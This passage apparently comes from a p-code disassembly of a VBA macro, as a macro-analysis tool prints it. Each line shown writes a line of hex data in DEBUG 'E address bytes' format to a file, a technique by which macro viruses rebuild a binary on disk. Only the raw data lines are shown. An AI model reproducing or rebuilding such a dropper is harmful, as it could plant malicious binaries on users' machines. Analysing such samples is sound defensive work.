' 	PrintItemNL 
' Line #1500:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 51A0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1501:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 51B0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 27 8E 90 53 67"
' 	PrintItemNL 
' Line #1502:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 51C0 72 47 5C 6B 30 46 58 4E 63 78 75 86 99 56 68 79"
' 	PrintItemNL 
' Line #1503:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 51D0 43 53 64 67 74 82 3E 47 50 00 00 04 00 00 F4 F4"
' 	PrintItemNL 
' Line #1504:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 51E0 F4 EE EE EE DD DF DF CB D0 CF BF C4 C5 B3 BA BD"
' 	PrintItemNL 
' Line #1505:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 51F0 00 02 09 60 69 76 5E 6A 7C 58 66 7C 49 57 73 11"
' 	PrintItemNL 
' Line #1506:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5200 D7 D5 09 F7 EF 09 F7 EF 0C ED E8 4C 62 7E 3E 50"
' 	PrintItemNL 
' Line #1507:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5210 6D 45 55 72 4A 58 74 5A 69 83 6F 7D 94 71 7E 94"
' 	PrintItemNL 
' Line #1508:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5220 7E 88 9A 9C A5 B3 DB E1 EE EC F1 FA F4 F7 FF F5"
' 	PrintItemNL 
' Line #1509:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5230 F8 FC F9 FB FC F8 FA FA FC FC FC FF FF FE FF FF"
' 	PrintItemNL 
' Line #1510:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5240 FE FF FF FE F8 F6 F5 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1511:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5250 46 F9 F3 EF EE F0 E8 E7 EB E4 E3 E7 EA E9 ED F3"
' 	PrintItemNL 
' Line #1512:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5260 F2 F6 EE EC F2 A2 DD DF 09 F7 EF 09 F7 EF 71 B6"
' 	PrintItemNL 
' Line #1513:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5270 BB 97 A7 B8 4C 59 79 13 21 4B 36 45 73 4C 5C 8B"
' 	PrintItemNL 
' Line #1514:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5280 5B 6B 9A 4E 5D 8E 53 5E 97 57 62 9C 56 6C A3 09"
' 	PrintItemNL 
' Line #1515:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5290 F7 EF 1A D1 D6 4B 5B 89 50 63 8E 57 6A 97 52 66"
' 	PrintItemNL 
' Line #1516:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 52A0 95 32 A7 BE 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1517:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 52B0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1518:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 52C0 F7 EF 09 F7 EF 33 DD E1 5A 6E 87 4F 5F 70 BA C3"
' 	PrintItemNL 
' Line #1519:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 52D0 CD 85 D2 D5 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1520:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 52E0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 16"
' 	PrintItemNL 
' Line #1521:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 52F0 DE DB 33 4F 67 38 53 6D 44 5C 78 37 4E 68 47 5F"
' 	PrintItemNL 
' Line #1522:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5300 73 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1523:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5310 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1524:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5320 F7 EF 2E AF B2 3A 4F 5E 36 4B 60 45 5A 70 76 87"
' 	PrintItemNL 
' Line #1525:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5330 9A 7A 8A 9B 5C 6A 7C 4B 58 66 31 3A 43 00 02 07"
' 	PrintItemNL 
' Line #1526:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5340 00 00 F4 F4 F4 ED ED ED DE E0 E0 CE D3 D2 BF C4"
' 	PrintItemNL 
' Line #1527:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5350 C5 AF B6 B9 00 03 0C 6A 75 83 53 61 74 5E 6E 85"
' 	PrintItemNL 
' Line #1528:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5360 5B 6C 87 1E C9 CD 09 F7 EF 09 F7 EF 20 D8 DA 66"
' 	PrintItemNL 
' Line #1529:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5370 7B 9A 77 8A AB 76 89 AA 6E 80 9F 60 72 8F 64 75"
' 	PrintItemNL 
' Line #1530:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5380 90 76 87 A1 7E 8E A5 76 85 98 92 9F AF BC C8 D4"
' 	PrintItemNL 
' Line #1531:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5390 DD E7 F1 E7 F1 F8 EC F2 F7 EC F1 F4 EE F3 F4 F8"
' 	PrintItemNL 
' Line #1532:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 53A0 FD FC FF FF FE F9 FA F8 FD FE FC 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1533:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 53B0 EF 09 F7 EF 46 F9 F3 F5 F4 F6 E1 E0 E4 E7 E6 EA"
' 	PrintItemNL 
' Line #1534:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 53C0 DE DD E1 E7 E5 EB EF EF F5 97 D3 D5 09 F7 EF 09"
' 	PrintItemNL 
' Line #1535:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 53D0 F7 EF 6C B2 BC 09 19 30 1B 2A 4B 30 3E 68 45 54"
' 	PrintItemNL 
' Line #1536:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 53E0 82 46 56 85 4A 59 8A 4D 5B 8F 50 5B 94 4C 57 91"
' 	PrintItemNL 
' Line #1537:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 53F0 38 7C A5 09 F7 EF 18 CF D5 46 57 82 43 57 80 41"
' 	PrintItemNL 
' Line #1538:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5400 55 7E 47 5C 89 3E 70 97 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1539:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5410 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1540:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5420 09 F7 EF 09 F7 EF 09 F7 EF 1F 84 97 40 55 71 46"
' 	PrintItemNL 
' Line #1541:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5430 57 6C AE B6 C3 B3 B9 C0 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1542:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5440 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1543:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5450 09 F7 EF 27 B9 BF 28 43 5D 30 4B 65 44 5D 77 3C"
' 	PrintItemNL 
' Line #1544:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5460 54 6C 42 5A 6E 11 E6 E0 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1545:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5470 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1546:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5480 09 F7 EF 09 F7 EF 18 D1 CE 39 4E 5D 52 68 7A 51"
' 	PrintItemNL 
' Line #1547:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5490 67 79 76 8A 9B 99 AC BB 84 94 A5 4F 5C 6A 2A 33"
' 	PrintItemNL 
' Line #1548:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 54A0 3C 00 02 06 00 00 FA FA FA EA EA EA DA DA DA D0"
' 	PrintItemNL 
' Line #1549:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 54B0 D2 D2 C0 C4 C5 B8 BE C3 00 00 08 4D 58 66 52 61"
' 	PrintItemNL 
' Line #1550:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 54C0 74 55 67 7E 7A 8D A8 47 BB C7 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1551:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 54D0 3D CC D3 87 9A B5 83 95 B2 80 92 AF 8F A4 C0 8F"
' 	PrintItemNL 
' Line #1552:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 54E0 A4 BF 71 86 A1 72 89 A3 6A 82 9A 6A 81 97 65 7B"
' 	PrintItemNL 
' Line #1553:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 54F0 8D 86 9A AB A5 B5 C5 B8 C8 D4 C9 D6 DE C9 D5 DB"
' 	PrintItemNL 
' Line #1554:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5500 D7 E0 E4 F6 FE FE FB FF FF FB FE FC FB FD FD 09"
' 	PrintItemNL 
' Line #1555:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5510 F7 EF 09 F7 EF 09 F7 EF 37 F8 F2 F5 F1 F6 E8 E4"
' 	PrintItemNL 
' Line #1556:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5520 EA D9 D7 DD DA D8 DE D7 D6 DF DE E0 E8 9C DA DE"
' 	PrintItemNL 
' Line #1557:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5530 09 F7 EF 09 F7 EF 29 6E 80 02 11 32 23 33 58 40"
' 	PrintItemNL 
' Line #1558:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5540 50 7A 41 51 7C 4D 5C 8A 49 57 87 4C 5A 8B 48 56"
' 	PrintItemNL 
' Line #1559:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5550 8B 46 54 89 36 7C A2 09 F7 EF 17 CE D4 40 51 82"
' 	PrintItemNL 
' Line #1560:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5560 40 52 81 40 52 81 43 54 85 40 54 84 1B C5 CE 09"
' 	PrintItemNL 
' Line #1561:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5570 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1562:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5580 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 3C 5D 80"
' 	PrintItemNL 
' Line #1563:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5590 21 34 59 2E 40 5D 9D A7 B8 AA B1 BA 3D E3 DF 09"
' 	PrintItemNL 
' Line #1564:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 55A0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1565:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 55B0 EF 09 F7 EF 09 F7 EF 37 A2 B0 35 53 6C 37 53 6B"
' 	PrintItemNL 
' Line #1566:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 55C0 49 64 79 43 5C 70 3B 54 64 1C C8 C7 09 F7 EF 09"
' 	PrintItemNL 
' Line #1567:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 55D0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1568:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 55E0 EF 09 F7 EF 09 F7 EF 09 F7 EF 0D EE E7 64 78 83"
' 	PrintItemNL 
' Line #1569:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 55F0 66 7C 88 2E 46 52 58 72 7E 81 9B A7 95 AA B9 6A"
' 	PrintItemNL 
' Line #1570:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5600 7B 88 68 73 7B 00 01 05 00 00 F5 F5 F5 ED ED ED"
' 	PrintItemNL 
' Line #1571:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5610 DF DF DF D1 D3 D3 BF C0 C4 B7 BB C0 00 00 0A 71"
' 	PrintItemNL 
' Line #1572:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5620 7C 8A 6F 7E 91 72 84 9B 73 87 A0 6D 8F A8 0F F0"
' 	PrintItemNL 
' Line #1573:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5630 EA 09 F7 EF 50 B4 C2 8D 9F B6 A0 B4 CD 9C AF CA"
' 	PrintItemNL 
' Line #1574:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5640 85 9A B5 87 9E B8 7B 92 AC 86 9F B9 83 9F B7 4B"
' 	PrintItemNL 
' Line #1575:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5650 66 7B 63 7B 91 6E 86 98 82 99 A9 99 AC B9 B1 C2"
' 	PrintItemNL 
' Line #1576:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5660 CB C3 D0 D8 D2 DE E4 EB F4 F8 F9 FE FF F7 FC FB"
' 	PrintItemNL 
' Line #1577:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5670 CF FE FC 09 F7 EF 09 F7 EF 09 F7 EF 45 F8 F3 FA"
' 	PrintItemNL 
' Line #1578:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5680 F6 FB E3 DF E5 D4 D2 D8 CE CD D6 C8 CA D2 CB CD"
' 	PrintItemNL 
' Line #1579:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5690 D7 98 D7 DC 09 F7 EF 09 F7 EF 14 59 6F 0D 1D 42"
' 	PrintItemNL 
' Line #1580:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 56A0 2F 40 67 43 53 7D 43 53 7E 49 58 86 44 52 83 42"
' 	PrintItemNL 
' Line #1581:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 56B0 50 81 45 53 87 44 52 86 2B 8F AD 09 F7 EF 16 CE"
' 	PrintItemNL 
' Line #1582:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 56C0 D4 40 51 84 41 52 85 42 53 86 45 56 89 44 55 88"
' 	PrintItemNL 
' Line #1583:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 56D0 2E 92 AF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1584:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 56E0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1C B8"
' 	PrintItemNL 
' Line #1585:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 56F0 C3 3B 4F 78 27 3C 62 23 35 54 90 9C AE A9 B0 B9"
' 	PrintItemNL 
' Line #1586:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5700 71 CD CF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1587:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5710 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 47 72 8B 36 54"
' 	PrintItemNL 
' Line #1588:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5720 6D 39 55 6D 4F 6A 7E 43 5D 6D 44 5D 6D 30 A7 AC"
' 	PrintItemNL 
' Line #1589:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5730 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1590:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5740 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1591:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5750 EF 52 75 7C 51 66 6E 21 38 40 42 5F 68 79 97 A2"
' 	PrintItemNL 
' Line #1592:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5760 98 AF BE 6F 80 8D 53 60 68 00 03 07 00 00 F6 F6"
' 	PrintItemNL 
' Line #1593:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5770 F6 F3 F3 F3 E3 E3 E3 D2 D4 D4 BE BF C3 B1 B5 BA"
' 	PrintItemNL 
' Line #1594:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5780 00 01 0B 85 90 9E 85 94 A7 80 92 A9 74 88 A1 67"
' 	PrintItemNL 
' Line #1595:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5790 7C 97 2D AF B9 0C ED E7 4D 6B 83 6B 7D 94 77 8B"
' 	PrintItemNL 
' Line #1596:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 57A0 A4 93 A7 C0 9B B1 CA 81 99 B1 78 90 A8 85 9F B7"
' 	PrintItemNL 
' Line #1597:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 57B0 6E 88 A0 5C 77 8C 62 7A 90 5C 74 86 6E 85 95 82"
' 	PrintItemNL 
' Line #1598:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 57C0 95 A2 99 A9 B5 B8 C4 CE CA D5 DD D6 E0 E7 EF F5"
' 	PrintItemNL 
' Line #1599:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 57D0 FA EF F4 F7 BB F9 FA 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1600:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 57E0 45 F8 F3 F9 F5 FA E2 E0 E6 D0 CE D4 C7 C6 CF C6"
' 	PrintItemNL 
' Line #1601:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 57F0 C7 D1 BC BE C9 A5 C6 CF 09 F7 EF 09 F7 EF 02 44"
' 	PrintItemNL 
' Line #1602:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5800 5A 22 31 58 41 51 7B 48 58 82 48 58 83 48 57 85"
' 	PrintItemNL 
' Line #1603:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5810 44 52 83 3E 4B 7F 45 53 88 45 53 88 26 A5 BB 09"
' 	PrintItemNL 
' Line #1604:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5820 F7 EF 18 CF D6 45 55 8A 47 57 8C 49 5A 8D 47 58"
' 	PrintItemNL 
' Line #1605:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5830 8B 47 58 89 47 58 89 11 E4 E3 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1606:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5840 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1607:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5850 F7 EF 28 65 84 2F 44 6A 23 38 5E 17 29 48 83 8F"
' 	PrintItemNL 
' Line #1608:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5860 A1 A0 A6 B1 A8 AE B5 1F F1 EA 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1609:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5870 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 26 C7 CB 49"
' 	PrintItemNL 
' Line #1610:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5880 67 82 3E 5C 75 41 5E 73 59 74 88 45 5F 6F 45 5E"
' 	PrintItemNL 
' Line #1611:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5890 6E 4A 7F 8A 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1612:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 58A0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1613:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 58B0 F7 EF 09 F7 EF 36 81 87 34 49 51 10 27 2F 46 63"
' 	PrintItemNL 
' Line #1614:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 58C0 6C 76 92 9D 9B B2 C1 8B 9C A9 4F 5C 64 00 02 06"
' 	PrintItemNL 
' Line #1615:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 58D0 00 00 F0 F0 F0 EC EC EC DB DB DB CF D1 D1 C5 C6"
' 	PrintItemNL 
' Line #1616:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 58E0 CA B4 B8 BD 00 00 08 89 94 A2 7B 8A 9D 51 63 7A"
' 	PrintItemNL 
' Line #1617:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 58F0 5C 70 89 67 7C 97 63 78 93 49 88 9B 44 55 6F 4C"
' 	PrintItemNL 
' Line #1618:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5900 5E 75 53 68 7E 75 89 A2 89 9F B8 9B B1 CA 86 9E"
' 	PrintItemNL 
' Line #1619:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5910 B6 72 8C A4 78 92 AA 5C 77 8C 64 7D 91 5E 76 88"
' 	PrintItemNL 
' Line #1620:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5920 70 87 97 74 87 96 79 89 96 9D AB B7 BA C6 D0 C9"
' 	PrintItemNL 
' Line #1621:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5930 D2 DC DD E2 EB E0 E3 EB D8 EB EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1622:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5940 EF 09 F7 EF 55 F9 F4 F8 F4 F9 E8 E6 EC C8 C8 CE"
' 	PrintItemNL 
' Line #1623:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5950 BC BD C7 C5 C7 D2 B1 B4 C2 AB B0 BF 41 D9 DA 1C"
' 	PrintItemNL 
' Line #1624:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5960 D1 D1 00 05 27 39 48 6F 4A 5A 84 49 59 84 4E 5D"
' 	PrintItemNL 
' Line #1625:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5970 8B 48 56 86 48 56 87 42 4F 83 42 50 85 42 50 85"
' 	PrintItemNL 
' Line #1626:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5980 17 CE D5 09 F7 EF 18 CF D6 47 57 8C 48 58 8D 48"
' 	PrintItemNL 
' Line #1627:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5990 59 8C 49 5A 8B 49 5B 8A 49 5A 8B 39 81 A4 09 F7"
' 	PrintItemNL 
' Line #1628:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 59A0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1629:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 59B0 09 F7 EF 14 BF C6 32 47 6D 34 4A 6E 22 38 5C 10"
' 	PrintItemNL 
' Line #1630:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 59C0 22 3F 75 81 93 93 9C A6 A1 A7 AE 79 D5 D5 09 F7"
' 	PrintItemNL 
' Line #1631:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 59D0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1632:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 59E0 3F 91 A2 4D 6C 85 48 67 7E 48 65 7A 60 7B 8F 4A"
' 	PrintItemNL 
' Line #1633:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 59F0 64 75 3B 54 64 51 6B 79 32 D1 D1 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1634:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5A00 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1635:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
